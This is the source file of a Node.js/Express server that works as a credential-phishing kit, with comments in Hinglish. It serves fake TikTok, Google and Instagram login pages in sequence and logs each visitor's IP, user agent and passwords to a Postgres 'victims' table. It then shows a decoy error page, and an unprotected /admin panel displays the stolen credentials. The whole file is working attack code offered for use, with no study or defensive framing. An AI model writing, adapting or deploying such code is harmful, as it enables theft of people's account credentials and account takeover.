require('dotenv').config();
const express = require('express');
const session = require('express-session');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ YEH NAYA BLOCK DAALO — Railway health check ke liye
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// Neon Database Connection
let pool;
try {
    pool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false },
        connectionTimeoutMillis: 5000  // 5 sec timeout
    });
    console.log("Database pool created");
} catch(e) {
    console.log("Database connection error:", e.message);
}
// Serve static files (CSS, images)
app.use(express.static('public'));

// === ROUTES ===

// TikTok Login Page
app.get('/', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.ip;
    req.session.victim_ip = ip;
    req.session.user_agent = req.headers['user-agent'];
    res.sendFile(__dirname + '/public/tiktok.html');
});

// TikTok Login Submit
app.post('/tiktok-login', async (req, res) => {
    const { username, password } = req.body;
    try {
        await pool.query(
            `INSERT INTO victims (ip_address, user_agent, tiktok_username, tiktok_password, stage_completed)
             VALUES ($1, $2, $3, $4, 1)`,
            [req.session.victim_ip, req.session.user_agent, username, password]
        );
    } catch(e) { console.log(e); }
    res.redirect('/google');
});

// Google Login Page
app.get('/google', (req, res) => {
    res.sendFile(__dirname + '/public/google.html');
});

// Google Login Submit
// Google Login Submit
app.post('/google-login', async (req, res) => {
    const { email, password } = req.body;  // ✅ DONO AA RAHE HAIN
    try {
        await pool.query(
            `UPDATE victims SET google_email=$1, google_password=$2, stage_completed=2
             WHERE ip_address=$3 AND stage_completed=1`,
            [email, password, req.session.victim_ip]
        );
    } catch(e) { console.log(e); }
    res.redirect('/instagram');
});
// Instagram Login Page
app.get('/instagram', (req, res) => {
    res.sendFile(__dirname + '/public/instagram.html');
});

// Instagram Login Submit
app.post('/instagram-login', async (req, res) => {
    const { username, password } = req.body;
    try {
        await pool.query(
            `UPDATE victims SET instagram_username=$1, instagram_password=$2, stage_completed=3
             WHERE ip_address=$3 AND stage_completed=2`,
            [username, password, req.session.victim_ip]
        );
    } catch(e) { console.log(e); }
    // Final redirect — victim ko normal page dikhao
    res.send(`
        <html><body style="text-align:center;padding:50px;font-family:sans-serif;">
        <h2>⚠️ Something went wrong. Please try again later.</h2>
        </body></html>
    `);
});
// Admin panel
app.get('/admin', async (req, res) => {
    try {
        const data = await pool.query('SELECT * FROM victims ORDER BY timestamp DESC');
        let html = '<h2>Captured Logs</h2><table border="1" cellpadding="8"><tr><th>IP</th><th>TikTok</th><th>Google</th><th>Instagram</th><th>Time</th></tr>';
        data.rows.forEach(r => {
            html += `<tr><td>${r.ip_address}</td><td>${r.tiktok_username}:${r.tiktok_password}</td><td>${r.google_email}:${r.google_password}</td><td>${r.instagram_username}:${r.instagram_password}</td><td>${r.timestamp}</td></tr>`;
        });
        html += '</table>';
        res.send(html);
    } catch(e) {
        res.send(`<h2>Database Error</h2><pre>${e.message}</pre>`);
    }
});

// Admin panel — captured credentials dekhne ke liye
app.get('/admin', async (req, res) => {
    const data = await pool.query('SELECT * FROM victims ORDER BY timestamp DESC');
    let html = '<h2>Captured Logs</h2><table border="1" cellpadding="8"><tr><th>IP</th><th>TikTok</th><th>Google</th><th>Instagram</th><th>Time</th></tr>';
    data.rows.forEach(r => {
        html += `<tr><td>${r.ip_address}</td><td>${r.tiktok_username}:${r.tiktok_password}</td><td>${r.google_email}:${r.google_password}</td><td>${r.instagram_username}:${r.instagram_password}</td><td>${r.timestamp}</td></tr>`;
    });
    html += '</table>';
    res.send(html);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
